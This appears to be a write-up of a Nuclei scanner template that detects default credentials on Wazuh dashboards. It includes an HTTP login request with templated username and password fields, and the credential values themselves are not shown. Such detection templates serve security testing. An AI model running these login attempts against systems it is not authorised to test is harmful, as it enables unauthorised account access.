# Nuclei Template: Wazuh - Default Login
**Template ID:** wazuh-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`wazuh-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Wazuh contains default credentials. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/app/login
POST /auth/login HTTP/1.1
Host: {{Hostname}}
Osd-Version: {{osd}}
osd-xsrf: osd-fetch
Content-Type: application/json

{"username":"{{username}}","password":"{{password}}"}
```

## References
- https://documentation.wazuh.com/current/user-manual/user-administration/password-management.html
- https://wazuh.com
- https://documentation.wazuh.com/current/deployment-options/docker/wazuh-container.html#single-node-deployment
